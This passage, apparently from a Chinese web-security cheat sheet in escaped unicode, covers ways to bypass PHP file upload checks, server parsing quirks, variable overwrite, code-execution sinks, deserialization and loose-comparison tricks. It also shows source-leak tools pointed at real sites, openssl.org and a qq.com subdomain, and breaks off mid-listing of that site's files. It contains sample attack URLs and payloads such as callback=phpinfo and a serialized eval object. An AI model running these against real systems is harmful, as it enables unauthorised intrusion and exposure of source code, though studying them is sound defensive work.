\u5e76\u4e14\u9632\u706b\u5899\u6216\u8005\u767d\u540d\u5355\u4e0d\u5141\u8bb8\u8bbf\u95ee\u5916\u7f51\u65f6\uff0c\u5148\u5728\u540c\u7ad9\u70b9\u627e\u4e00\u4e2a XSS \u6f0f\u6d1e\uff0c\u5305\u542b\u8fd9\u4e2a\u9875\u9762\uff0c\u5c31\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u4ee3\u7801\u4e86\u3002\n\n\n\n\n\n\n\u6587\u4ef6\u4e0a\u4f20\n\n\n\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u662f\u6307\u7528\u6237\u4e0a\u4f20\u4e86\u4e00\u4e2a\u53ef\u6267\u884c\u811a\u672c\u6587\u4ef6\uff0c\u5e76\u901a\u8fc7\u6b64\u6587\u4ef6\u83b7\u5f97\u4e86\u6267\u884c\u670d\u5668\u7aef\u547d\u4ee4\u7684\u80fd\u529b\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u4e00\u822c\u662f\u6307\u4e0a\u4f20 WEB \u811a\u672c\u80fd\u591f\u88ab\u670d\u52a1\u5668\u89e3\u6790\u7684\u95ee\u9898\uff0c\u4e5f\u5c31\u662f\u6240\u8c13\u7684 webshell \u95ee\u9898\u3002\u5b8c\u6210\u8fd9\u4e00\u653b\u51fb\u9700\u8981\u8fd9\u6837\u51e0\u4e2a\u6761\u4ef6\uff0c\u4e00\u662f\u4e0a\u4f20\u7684\u6587\u4ef6\u80fd\u591f\u8fd9 WEB \u5bb9\u5668\u6267\u884c\uff0c\u5176\u6b21\u7528\u6237\u80fd\u4ece WEB \u4e0a\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6700\u540e\uff0c\u5982\u679c\u4e0a\u4f20\u7684\u6587\u4ef6\u88ab\u5b89\u5168\u68c0\u67e5\u3001\u683c\u5f0f\u5316\u3001\u56fe\u7247\u538b\u7f29\u7b49\u529f\u80fd\u6539\u53d8\u4e86\u5185\u5bb9\uff0c\u5219\u53ef\u80fd\u5bfc\u81f4\u653b\u51fb\u5931\u8d25\u3002\n\n\n\u7ed5\u8fc7\u4e0a\u4f20\u68c0\u67e5\n\n\n\n\n\n\n\u524d\u7aef\u68c0\u67e5\u6269\u5c55\u540d\n\n\n\u6293\u5305\u7ed5\u8fc7\u5373\u53ef\u3002\n\n\n\n\n\n\nContent-Type\n \u68c0\u6d4b\u6587\u4ef6\u7c7b\u578b\n\n\n\u6293\u5305\u4fee\u6539 \nContent-Type\n \u7c7b\u578b\uff0c\u4f7f\u5176\u7b26\u5408\u767d\u540d\u5355\u89c4\u5219\u3002\n\n\n\n\n\n\n\u670d\u52a1\u7aef\u6dfb\u52a0\u540e\u7f00\n\n\n\u5c1d\u8bd5 \n%00\n \u622a\u65ad\u3002\n\n\n\n\n\n\n\u670d\u52a1\u7aef\u6269\u5c55\u540d\u68c0\u6d4b\n\n\n\u5229\u7528\u89e3\u6790\u6f0f\u6d1e\u3002\n\n\n\n\n\n\nApache \u89e3\u6790\n\n\nphpshell.php.rar.rar.rar.rar\n \u56e0\u4e3a Apache \u4e0d\u8ba4\u8bc6 \n.rar\n \u8fd9\u4e2a\u6587\u4ef6\u7c7b\u578b\uff0c\u6240\u4ee5\u4f1a\u4e00\u76f4\u904d\u5386\u540e\u7f00\u5230 \n.php\n\uff0c\u7136\u540e\u8ba4\u4e3a\u8fd9\u662f\u4e00\u4e2a PHP \u6587\u4ef6\u3002\n\n\n\n\n\n\nIIS \u89e3\u6790\n\n\nIIS 6 \u4e0b\u5f53\u6587\u4ef6\u540d\u4e3a \nabc.asp;xx.jpg\n \u65f6\uff0c\u4f1a\u5c06\u5176\u89e3\u6790\u4e3a \nabc.asp\n\u3002\n\n\n\n\n\n\nPHP CGI \u8def\u5f84\u89e3\u6790\n\n\n\u5f53\u8bbf\u95ee \nhttp://www.a.com/path/test.jpg/notexist.php\n \u65f6\uff0c\u4f1a\u5c06 \ntest.jpg\n \u5f53\u505a PHP \u89e3\u6790\uff0c \nnotexist.php\n \u662f\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u3002\u6b64\u65f6 Nginx \u7684\u914d\u7f6e\u5982\u4e0b\n\n\nlocation\n \n~\n \n\\.php$\n \n{\n\n  \nroot\n \nhtml\n;\n\n  \nfastcgi_pass\n \n127.0.0.1\n:\n9000\n;\n\n  \nfastcgi_index\n \nindex.php\n;\n\n  \nfastcgi_param\n \nSCRIPT_FILENAME\n \n/scripts\n$fastcgi_script_name\n;\n\n  \ninclude\n \nfastcgi_param\n;\n\n\n}\n\n\n\n\n\n\n\n\n\n\u5176\u4ed6\u65b9\u5f0f\n\n\n\u540e\u7f00\u5927\u5c0f\u5199\u3001\u53cc\u5199\u3001\u7279\u6b8a\u540e\u7f00\u5982 \nphp5\n \u7b49\uff0c\u4fee\u6539\u5305\u5185\u5bb9\u7684\u5927\u5c0f\u5199\u8fc7 WAF \u7b49\u3002\n\n\n\n\n\n\n\u53d8\u91cf\u8986\u76d6\n\n\n\u5168\u5c40\u53d8\u91cf\u8986\u76d6\n\n\n\u53d8\u91cf\u5982\u679c\u672a\u88ab\u521d\u59cb\u5316\uff0c\u4e14\u80fd\u591f\u7528\u6237\u6240\u63a7\u5236\uff0c\u90a3\u4e48\u5f88\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5b89\u5168\u95ee\u9898\u3002\n\n\nregister_globals\n=\nON\n\n\n\n\n\n\u793a\u4f8b\n\n\n?php\n\n\necho\n \nRegister_globals: \n \n.\n \n(\nint\n)\nini_get\n(\nregister_globals\n)\n \n.\n \nbr/\n;\n\n\n\nif\n \n(\n$auth\n)\n \n{\n\n  \necho\n \nprivate!\n;\n\n\n}\n\n\n?\n\n\n\n\n\n\u5f53 \nregister_globals=ON\n \u65f6\uff0c\u63d0\u4ea4 \ntest.php?auth=1\n\uff0c\nauth\n \u53d8\u91cf\u5c06\u81ea\u52a8\u5f97\u5230\u8d4b\u503c\u3002\n\n\nextract()\n \u53d8\u91cf\u8986\u76d6\n\n\nextract()\n \u51fd\u6570\u80fd\u591f\u5c06\u53d8\u91cf\u4ece\u6570\u7ec4\u5bfc\u5165\u5230\u5f53\u524d\u7684\u7b26\u53f7\u8868\uff0c\u5176\u5b9a\u4e49\u4e3a\n\n\nint extract ( array $var_array [, int $extract_type [, string $prefix ]] )\n\n\n\n\n\u5176\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\u51fd\u6570\u5c06\u53d8\u91cf\u5bfc\u5165\u7b26\u53f7\u8868\u65f6\u7684\u884c\u4e3a\uff0c\u6700\u5e38\u89c1\u7684\u4e24\u4e2a\u503c\u662f \nEXTR_OVERWRITE\n \u548c \nEXTR_SKIP\n\u3002\n\n\n\u5f53\u503c\u4e3a \nEXTR_OVERWRITE\n \u65f6\uff0c\u5728\u5c06\u53d8\u91cf\u5bfc\u5165\u7b26\u53f7\u8868\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u53d8\u91cf\u540d\u53d1\u751f\u51b2\u7a81\uff0c\u5219\u8986\u76d6\u6240\u6709\u53d8\u91cf\uff1b\u503c\u4e3a \nEXTR_SKIP\n \u5219\u8868\u793a\u8df3\u8fc7\u4e0d\u8986\u76d6\u3002\u82e5\u7b2c\u4e8c\u4e2a\u53c2\u6570\u672a\u6307\u5b9a\uff0c\u5219\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f7f\u7528 \nEXTR_OVERWRITE\n\u3002\n\n\n?php\n\n\n$auth\n \n=\n \n0\n;\n\n\nextract\n(\n$_GET\n);\n\n\n\nif\n \n(\n$auth\n \n==\n \n1\n)\n \n{\n\n  \necho\n \nprivate!\n;\n\n\n}\n \nelse\n \n{\n\n  \necho\n \npublic!\n;\n\n\n}\n\n\n?\n\n\n\n\n\n\u5f53 \nextract()\n \u51fd\u6570\u4ece\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u7684\u6570\u7ec4\u4e2d\u5bfc\u51fa\u53d8\u91cf\u65f6\uff0c\u53ef\u80fd\u53d1\u751f\u53d8\u91cf\u8986\u76d6\u3002\n\n\nimport_request_variables\n \u53d8\u91cf\u8986\u76d6\n\n\nbool import_request_variables (string $types [, string $prefix])\n\n\n\n\nimport_request_variables\n \u5c06 GET\u3001POST\u3001Cookies \u4e2d\u7684\u53d8\u91cf\u5bfc\u5165\u5230\u5168\u5c40\uff0c\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u53ea\u7528\u7b80\u5355\u5730\u6307\u5b9a\u7c7b\u578b\u5373\u53ef\u3002\n\n\n?php\n\n\n$auth\n \n=\n \n0\n;\n\n\nimport_request_variables\n(\nG\n);\n\n\n\nif\n \n(\n$auth\n \n==\n \n1\n)\n \n{\n\n  \necho\n \nprivate!\n;\n\n\n}\n \nelse\n \n{\n\n  \necho\n \npublic!\n;\n\n\n}\n\n\n?\n\n\n\n\n\nimport_request_variables(\nG\n)\n \u6307\u5b9a\u5bfc\u5165 GET \u8bf7\u6c42\u4e2d\u7684\u53d8\u91cf\uff0c\u63d0\u4ea4 \ntest.php?auth=1\n \u51fa\u73b0\u53d8\u91cf\u8986\u76d6\u3002\n\n\nparse_str()\n \u53d8\u91cf\u8986\u76d6\n\n\nvoid parse_str ( string $str [, array \n$arr ])\n\n\n\n\nparse_str()\n \u51fd\u6570\u901a\u5e38\u7528\u4e8e\u89e3\u6790 URL \u4e2d\u7684 querystring\uff0c\u4f46\u662f\u5f53\u53c2\u6570\u503c\u53ef\u4ee5\u88ab\u7528\u6237\u63a7\u5236\u65f6\uff0c\u5f88\u53ef\u80fd\u5bfc\u81f4\u53d8\u91cf\u8986\u76d6\u3002\n\n\n// var.php?var=new  \u53d8\u91cf\u8986\u76d6\n\n\n$var = \ninit\n;\n\n\nparse_str($_SERVER[\nQUERY_STRING\n]);\n\n\nprint $var;\n\n\n\n\n\n\u4e0e \nparse_str()\n \u7c7b\u4f3c\u7684\u51fd\u6570\u8fd8\u6709 \nmb_parse_str()\n\u3002\n\n\n\u547d\u4ee4\u6267\u884c\n\n\n\u76f4\u63a5\u6267\u884c\u4ee3\u7801\n\n\nPHP \u4e2d\u6709\u4e0d\u5c11\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u4ee3\u7801\u7684\u51fd\u6570\u3002\n\n\neval();\n\n\nassert();\n\n\nsystem();\n\n\nexec();\n\n\nshell_exec();\n\n\npassthru();\n\n\nescapeshellcmd();\n\n\npcntl_exec();\n\n\n......\n\n\n\n\n\npreg_replace()\n \u4ee3\u7801\u6267\u884c\n\n\npreg_replace()\n \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5982\u679c\u5b58\u5728 \n/e\n \u6a21\u5f0f\u4fee\u9970\u7b26\uff0c\u5219\u5141\u8bb8\u4ee3\u7801\u6267\u884c\u3002\n\n\n?php\n\n\n$var\n \n=\n \ntag\nphpinfo()\n/tag\n;\n\n\npreg_replace\n(\n/\ntag\n(.*?)\n\\/tag\n/e\n,\n \naddslashes(\n\\\\\n1)\n,\n \n$var\n);\n\n\n?\n\n\n\n\n\n\u5982\u679c\u6ca1\u6709 \n/e\n \u4fee\u9970\u7b26\uff0c\u53ef\u4ee5\u5c1d\u8bd5 %00 \u622a\u65ad\u3002\n\n\n\u52a8\u6001\u51fd\u6570\u6267\u884c\n\n\n\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\u53ef\u4ee5\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002\n\n\n?php\n\n\n$dyn_func\n \n=\n \n$_GET\n[\ndyn_func\n];\n\n\n$argument\n \n=\n \n$_GET\n[\nargument\n];\n\n\n$dyn_func\n(\n$argument\n);\n\n\n?\n\n\n\n\n\n\u53cd\u5f15\u53f7\u547d\u4ee4\u6267\u884c\n\n\n?php\n\n\necho\n \n`ls -al`\n;\n\n\n?\n\n\n\n\n\nCurly Syntax\n\n\nPHP \u7684 Curly Syntax \u4e5f\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\uff0c\u5b83\u5c06\u6267\u884c\u82b1\u62ec\u53f7\u95f4\u7684\u4ee3\u7801\uff0c\u5e76\u5c06\u7ed3\u679c\u66ff\u6362\u56de\u53bb\u3002\n\n\n?php\n\n\n$var\n \n=\n \naaabbbccc \n${\n`ls`\n}\n;\n\n\n?\n\n\n\n\n\n?php\n\n\n$foobar\n \n=\n \nphpinfo\n;\n\n\n$\n{\nfoobar\n}();\n\n\n?\n\n\n\n\n\n\u56de\u8c03\u51fd\u6570\n\n\n\u5f88\u591a\u51fd\u6570\u90fd\u53ef\u4ee5\u6267\u884c\u56de\u8c03\u51fd\u6570\uff0c\u5f53\u56de\u8c03\u51fd\u6570\u7528\u6237\u53ef\u63a7\u65f6\uff0c\u5c06\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002\n\n\n?php\n\n\n$evil_callback\n \n=\n \n$_GET\n[\ncallback\n];\n\n\n$some_array\n \n=\n \narray\n(\n0\n,\n1\n,\n2\n,\n3\n);\n\n\n$new_array\n \n=\n \narray_map\n(\n$evil_callback\n,\n \n$some_array\n);\n\n\n?\n\n\n\n\n\n\u653b\u51fb payload\n\n\nhttp://www.a.com/index.php?callback=phpinfo\n\n\n\n\n\u53cd\u5e8f\u5217\u5316\n\n\n\u5982\u679c \nunserialize()\n \u5728\u6267\u884c\u65f6\u5b9a\u4e49\u4e86 \n__destruct()\n \u6216 \n__wakeup()\n \u51fd\u6570\uff0c\u5219\u6709\u53ef\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002\n\n\n?php\n\n\nclass\n \nExample\n \n{\n\n  \nvar\n \n$var\n \n=\n \n;\n\n  \nfunction\n \n__destruct\n()\n \n{\n\n    \neval\n(\n$this\n-\n$var\n);\n\n  \n}\n\n\n}\n\n\nunserialize\n(\n$_GET\n[\nsaved_code\n]);\n\n\n?\n\n\n\n\n\n\u653b\u51fb payload\n\n\nhttp://www.a.com/index.php?saved_code=O:7:\nExample\n:1:{s:3:\nvar\n;s:10:\nphpinfo();\n;}\n\n\n\n\nPHP \u7279\u6027\n\n\n\u6570\u7ec4\n\n\n?php\n\n\n$var\n \n=\n \n1\n;\n\n\n$var\n \n=\n \narray\n();\n\n\n$var\n \n=\n \nstring\n;\n\n\n?\n\n\n\n\n\nphp \u4e0d\u4f1a\u4e25\u683c\u68c0\u9a8c\u4f20\u5165\u7684\u53d8\u91cf\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u5c06\u53d8\u91cf\u81ea\u7531\u7684\u8f6c\u6362\u7c7b\u578b\u3002\n\n\n\u6bd4\u5982\u5728 \n$a == $b\n \u7684\u6bd4\u8f83\u4e2d\n\n\n$a = null; \n\n\n$b = false; //\u4e3a\u771f \n\n\n$a = \n; \n\n\n$b = 0; //\u540c\u6837\u4e3a\u771f\n\n\n\n\n\n\u7136\u800c\uff0cPHP \u5185\u6838\u7684\u5f00\u53d1\u8005\u539f\u672c\u662f\u60f3\u8ba9\u7a0b\u5e8f\u5458\u501f\u7531\u8fd9\u79cd\u4e0d\u9700\u8981\u58f0\u660e\u7684\u4f53\u7cfb\uff0c\u66f4\u52a0\u9ad8\u6548\u7684\u5f00\u53d1\uff0c\u6240\u4ee5\u5728\u51e0\u4e4e\u6240\u6709\u5185\u7f6e\u51fd\u6570\u4ee5\u53ca\u57fa\u672c\u7ed3\u6784\u4e2d\u4f7f\u7528\u4e86\u5f88\u591a\u677e\u6563\u7684\u6bd4\u8f83\u548c\u8f6c\u6362\uff0c\u9632\u6b62\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cf\u56e0\u4e3a\u7a0b\u5e8f\u5458\u7684\u4e0d\u89c4\u8303\u800c\u9891\u7e41\u7684\u62a5\u9519\uff0c\u7136\u800c\u8fd9\u5374\u5e26\u6765\u4e86\u5b89\u5168\u95ee\u9898\u3002\n\n\n0==\n0\n //true\n\n\n0 == \nabcdefg\n //true\n\n\n0 === \nabcdefg\n //false\n\n\n1 == \n1abcdef\n //true\n\n\n\n\n\n\u9b54\u6cd5 Hash\n\n\n0e132456789\n==\n0e7124511451155\n //true\n\n\n0e123456abc\n==\n0e1dddada\n //false\n\n\n0e1abc\n==\n0\n  //true\n\n\n\n\n\n\u5728\u8fdb\u884c\u6bd4\u8f83\u8fd0\u7b97\u65f6\uff0c\u5982\u679c\u9047\u5230\u4e86 \n0e\\d+\n \u8fd9\u79cd\u5b57\u7b26\u4e32\uff0c\u5c31\u4f1a\u5c06\u8fd9\u79cd\u5b57\u7b26\u4e32\u89e3\u6790\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\u3002\u6240\u4ee5\u4e0a\u9762\u4f8b\u5b50\u4e2d 2 \u4e2a\u6570\u7684\u503c\u90fd\u662f 0 \u56e0\u800c\u5c31\u76f8\u7b49\u4e86\u3002\u5982\u679c\u4e0d\u6ee1\u8db3 \n0e\\d+\n \u8fd9\u79cd\u6a21\u5f0f\u5c31\u4e0d\u4f1a\u76f8\u7b49\u3002\n\n\n\u5341\u516d\u8fdb\u5236\u8f6c\u6362\n\n\n0x1e240\n==\n123456\n //true\n\n\n0x1e240\n==123456 //true\n\n\n0x1e240\n==\n1e240\n //false\n\n\n\n\n\n\u5f53\u5176\u4e2d\u7684\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f \n0x\n \u5f00\u5934\u7684\u65f6\u5019\uff0cPHP \u4f1a\u5c06\u6b64\u5b57\u7b26\u4e32\u89e3\u6790\u6210\u4e3a\u5341\u8fdb\u5236\u7136\u540e\u518d\u8fdb\u884c\u6bd4\u8f83\uff0c\n0x1240\n \u89e3\u6790\u6210\u4e3a\u5341\u8fdb\u5236\u5c31\u662f 123456\uff0c\u6240\u4ee5\u4e0e \nint\n \u7c7b\u578b\u548c \nstring\n \u7c7b\u578b\u7684 123456 \u6bd4\u8f83\u90fd\u662f\u76f8\u7b49\u3002\n\n\n\u7c7b\u578b\u8f6c\u6362\n\n\n\u5e38\u89c1\u7684\u8f6c\u6362\u4e3b\u8981\u5c31\u662f \nint\n \u8f6c\u6362\u4e3a \nstring\n\uff0c\nstring\n \u8f6c\u6362\u4e3a \nint\n\u3002\n\n\nint\n \u8f6c \nstring\n\n\n$var = 5;\n\n\n\u65b9\u5f0f1\uff1a$item = (string)$var;\n\n\n\u65b9\u5f0f2\uff1a$item = strval($var);\n\n\n\n\n\nstring\n \u8f6c \nint\n\uff1a\nintval()\n \u51fd\u6570\u3002\n\n\n\u5bf9\u4e8e\u8fd9\u4e2a\u51fd\u6570\uff0c\u53ef\u4ee5\u5148\u770b 2 \u4e2a\u4f8b\u5b50\u3002\n\n\nvar_dump(intval(\n2\n)) //2\n\n\nvar_dump(intval(\n3abcd\n)) //3\n\n\nvar_dump(intval(\nabcd\n)) //0\n\n\n\n\n\n\u8bf4\u660e \nintval()\n \u8f6c\u6362\u7684\u65f6\u5019\uff0c\u4f1a\u5c06\u4ece\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\u77e5\u9053\u9047\u5230\u4e00\u4e2a\u975e\u6570\u5b57\u7684\u5b57\u7b26\u3002\u5373\u4f7f\u51fa\u73b0\u65e0\u6cd5\u8f6c\u6362\u7684\u5b57\u7b26\u4e32\uff0c \nintval()\n \u4e0d\u4f1a\u62a5\u9519\u800c\u662f\u8fd4\u56de 0\u3002\n\n\n\u540c\u65f6\uff0c\u7a0b\u5e8f\u5458\u5728\u7f16\u7a0b\u7684\u65f6\u5019\u4e5f\u4e0d\u5e94\u8be5\u4f7f\u7528\u5982\u4e0b\u7684\u8fd9\u6bb5\u4ee3\u7801\uff1a\n\n\nif(intval($a)\n1000) {\n\n\n mysql_query(\nselect * from news where id=\n.$a)\n\n\n}\n\n\n\n\n\n\u8fd9\u4e2a\u65f6\u5019 \n$a\n \u7684\u503c\u6709\u53ef\u80fd\u662f \n1002 union\n\u3002\n\n\n\u5185\u7f6e\u51fd\u6570\u7684\u53c2\u6570\u7684\u677e\u6563\u6027\n\n\n\u5185\u7f6e\u51fd\u6570\u7684\u677e\u6563\u6027\u8bf4\u7684\u662f\uff0c\u8c03\u7528\u51fd\u6570\u65f6\u7ed9\u51fd\u6570\u4f20\u9012\u51fd\u6570\u65e0\u6cd5\u63a5\u53d7\u7684\u53c2\u6570\u7c7b\u578b\u3002\u89e3\u91ca\u8d77\u6765\u6709\u70b9\u62d7\u53e3\uff0c\u8fd8\u662f\u76f4\u63a5\u901a\u8fc7\u5b9e\u9645\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u95ee\u9898\uff0c\u4e0b\u9762\u4f1a\u91cd\u70b9\u4ecb\u7ecd\u51e0\u4e2a\u8fd9\u79cd\u51fd\u6570\u3002\n\n\nmd5()\n\n\n$array1[] = array(\n\n\n \nfoo\n =\n \nbar\n,\n\n\n \nbar\n =\n \nfoo\n,\n\n\n);\n\n\n$array2 = array(\nfoo\n, \nbar\n, \nhello\n, \nworld\n);\n\n\nvar_dump(md5($array1)==var_dump($array2)); //true\n\n\n\n\n\nPHP \u624b\u518c\u4e2d\u7684 md5\uff08\uff09\u51fd\u6570\u7684\u63cf\u8ff0\u662f \nstring md5 ( string $str [, bool $raw_output = false ] )\n\uff0c\nmd5()\n \u4e2d\u7684\u9700\u8981\u662f\u4e00\u4e2a string \u7c7b\u578b\u7684\u53c2\u6570\u3002\u4f46\u662f\u5f53\u4f60\u4f20\u9012\u4e00\u4e2a array \u65f6\uff0c\nmd5()\n \u4e0d\u4f1a\u62a5\u9519\uff0c\u53ea\u662f\u4f1a\u65e0\u6cd5\u6b63\u786e\u5730\u6c42\u51fa array \u7684 md5 \u503c\uff0c\u8fd9\u6837\u5c31\u4f1a\u5bfc\u81f4\u4efb\u610f 2 \u4e2a array \u7684 md5 \u503c\u90fd\u4f1a\u76f8\u7b49\u3002\n\n\nstrcmp()\n\n\nstrcmp()\n \u51fd\u6570\u5728 PHP \u5b98\u65b9\u624b\u518c\u4e2d\u7684\u63cf\u8ff0\u662f \nintstrcmp ( string $str1 \uff0c string $str2 )\n\uff0c\u9700\u8981\u7ed9 \nstrcmp()\n \u4f20\u9012 2 \u4e2a \nstring\n \u7c7b\u578b\u7684\u53c2\u6570\u3002\u5982\u679c \nstr1\n \u5c0f\u4e8e \nstr2\n\uff0c\u8fd4\u56de -1\uff0c\u76f8\u7b49\u8fd4\u56de 0\uff0c\u5426\u5219\u8fd4\u56de 1\u3002\nstrcmp()\n \u51fd\u6570\u6bd4\u8f83\u5b57\u7b26\u4e32\u7684\u672c\u8d28\u662f\u5c06\u4e24\u4e2a\u53d8\u91cf\u8f6c\u6362\u4e3a ASCII\uff0c\u7136\u540e\u8fdb\u884c\u51cf\u6cd5\u8fd0\u7b97\uff0c\u7136\u540e\u6839\u636e\u8fd0\u7b97\u7ed3\u679c\u6765\u51b3\u5b9a\u8fd4\u56de\u503c\u3002\n\n\n\u5982\u679c\u4f20\u5165\u7ed9\u51fa \nstrcmp()\n \u7684\u53c2\u6570\u662f\u6570\u5b57\u5462\uff1f\n\n\n$array=[1,2,3];\n\n\nvar_dump(strcmp($array,\n123\n)); //null,\u5728\u67d0\u79cd\u610f\u4e49\u4e0anull\u4e5f\u5c31\u662f\u76f8\u5f53\u4e8efalse\u3002\n\n\n\n\n\nswitch()\n\n\n\u5982\u679c \nswitch()\n \u662f\u6570\u5b57\u7c7b\u578b\u7684 case \u7684\u5224\u65ad\u65f6\uff0cswitch \u4f1a\u5c06\u5176\u4e2d\u7684\u53c2\u6570\u8f6c\u6362\u4e3a int \u7c7b\u578b\u3002\u5982\u4e0b\uff1a\n\n\n$i =\n2abc\n;\n\n\nswitch ($i) {\n\n\ncase 0:\n\n\ncase 1:\n\n\ncase 2:\n\n\n echo \ni is less than 3 but not negative\n;\n\n\n break;\n\n\ncase 3:\n\n\n echo \ni is 3\n;\n\n\n}\n\n\n\n\n\n\u8fd9\u4e2a\u65f6\u5019\u7a0b\u5e8f\u8f93\u51fa\u7684\u662f \ni is less than 3 but not negative\n \uff0c\u662f\u7531\u4e8e \nswitch()\n \u51fd\u6570\u5c06 \n$i\n \u8fdb\u884c\u4e86\u7c7b\u578b\u8f6c\u6362\uff0c\u8f6c\u6362\u7ed3\u679c\u4e3a 2\u3002\n\n\nin_array()\n\n\n\u5728 PHP \u624b\u518c\u4e2d\uff0c \nin_array()\n \u51fd\u6570\u7684\u89e3\u91ca\u662f \nbool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )\n ,\u5982\u679cstrict\u53c2\u6570\u6ca1\u6709\u63d0\u4f9b\uff0c\u90a3\u4e48in_array\u5c31\u4f1a\u4f7f\u7528\u677e\u6563\u6bd4\u8f83\u6765\u5224\u65ad \n$needle\n \u662f\u5426\u5728 \n$haystack\n \u4e2d\u3002\u5f53 strince \u7684\u503c\u4e3a true \u65f6\uff0c \nin_array()\n \u4f1a\u6bd4\u8f83 needls \u7684\u7c7b\u578b\u548c haystack \u4e2d\u7684\u7c7b\u578b\u662f\u5426\u76f8\u540c\u3002\n\n\n$array=[0,1,2,\n3\n];\n\n\nvar_dump(in_array(\nabc\n, $array)); //true\n\n\nvar_dump(in_array(\n1bc\n, $array)); //true\n\n\n\n\n\n\u53ef\u4ee5\u770b\u5230\u4e0a\u9762\u7684\u60c5\u51b5\u8fd4\u56de\u7684\u90fd\u662f true\uff0c\u56e0\u4e3a \n'abc'\n \u4f1a\u8f6c\u6362\u4e3a 0\uff0c \n'1bc'\n \u8f6c\u6362\u4e3a 1\u3002\n\n\narray_search()\n \u4e0e \nin_array()\n \u4e5f\u662f\u4e00\u6837\u7684\u95ee\u9898\u3002\n\n\n\u5bfb\u627e\u6e90\u4ee3\u7801\u5907\u4efd\n\n\nhg \u6e90\u7801\u6cc4\u9732\n\n\nhg init\n \u65f6\u4f1a\u4ea7\u751f \n.hg\n \u6587\u4ef6\u3002\n\n\n\u5229\u7528\u5de5\u5177 dvcs-ripper\n\n\nGit \u6e90\u7801\u6cc4\u9732\n\n\n.git\n \u76ee\u5f55\u5185\u6709\u4ee3\u7801\u7684\u53d8\u66f4\u8bb0\u5f55\u7b49\u6587\u4ef6\uff0c\u5982\u679c\u90e8\u7f72\u65f6\u8be5\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u53ef\u88ab\u8bbf\u95ee\uff0c\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u6765\u6062\u590d\u6e90\u4ee3\u7801\u3002\n\n\n/.git\n/.git/HEAD\n/.git/index\n/.git/config\n/.git/description\n\n\n\n\nGitHack\n\n\npython GitHack.py http://www.openssl.org/.git/\n\n\n\n\nGitHacker\uff08\u53ef\u6062\u590d\u5b8c\u6574 Git \u4ed3\u5e93\uff09\n\n\npython GitHacker.py http://www.openssl.org/.git/\n\n\n\n\n.DS_Store\n \u6587\u4ef6\u6cc4\u9732\n\n\nMac OS \u4e2d\u4f1a\u5305\u542b\u6709 \n.DS_Store\n \u6587\u4ef6\uff0c\u5305\u542b\u6587\u4ef6\u540d\u7b49\u4fe1\u606f\u3002\n\n\n\u5229\u7528\u5de5\u5177 ds\uff3fstore\uff3fexp\n\n\npython ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store\n\nhd.zj.qq.com/\n\u2514\u2500\u2500 themes\n    \u2514\u2500\u2500 galaxyw\n        \u251c\u2500\u2500 app\n        \u2502   \u2514\u2500\u2500 css\n        \u2502       \u2514\u2500\u2500 style.min.css\n        \u251c\u2500\u2500 cityData.min.js\n        \u251c\u2500\u2500 images\n        \u2502   \u2514\u2500\u2500 img\n        \u2502       \u251c\u2500\u2500 bg-hd.png\n        \u2502       \u251c\u2500\u2500 bg-item-activity.png\n        \u2502       \u251c\u2500\u2500 bg-masker-pop.png\n        \u2502       \u251c\u2500\u2500 btn-bm.png\n        \u2502       \u251c\u2500\u2500 btn-login-qq.png\n        \u2502       \u251c\u2500\u2500 btn-login-wx.png\n        \u2502       \u251c\u2500\u2500 ico-add-pic.png\n        \u2502       \u251c\u2500\u2500 ico-address.png\n        \u2502       \u251c\u2500\u2500 ico-bm.png\n        \u2502       \u251c\u2500\u2500 ico-duration-time.png\n        \u2502       \u251c\u2500\u2500 ico-pop-close.png\n        \u2502       \u251c\u2500\u2500 ico-right-top-delete.png\n        \u2502       \u251c\u2500\u2500 page-login-hd.png\n        \u2502       \u251c\u2500\u2500 pic-masker.png\n        \u2502       \u2514\u2500\u2500 ticket-selected.png\n        \u2514\u2500\u2500 member\n            \u251c\u2500\u2500 assets\n            \u2502   \u251c\u2500\u2500 css\n            \u2502   \u2502   \u251c\u2500\u2500 ace-reset.css\n            \u2502   \u2502   \u2514\u2500\u2500 antd.css\n            \u2502   \u2514\u2500\u2500 lib\n            \u2502       \u251c\u2500\u2500 cityData.min.js\n            \u2502       \u2514\u2500\u2500 ueditor\n            \u2502           \u251c\u2500\u2500 index.html\n            \u2502           \u251c\u2500\u2500 lang\n            \u2502           \u2502   \u2514\u2500\u2500 zh-cn\n            \u2502           \u2502       \u251c\u2500\u2500 images\n            \u2502           \u2502       \u2502   \u251c\u2500\u2500 copy.png\n            \u2502           \u2502       \u2502   \u251c\u2500\u2500 localimage.png\n            \u2502           \u2502       \u2502   \u251c\u2500\u2500 music.png\n            \u2502           \u2502       \u2502   \u2514\u2500\u2500 upload.png\n            \u2502           \u2502       \u2514\u2500\u2500 zh-cn.js\n            \u2502           \u251c\u2500\u2500 php\n            \u2502           \u2502   \u251c\u2500\u2500 action_crawler.php\n            \u2502           \u2502   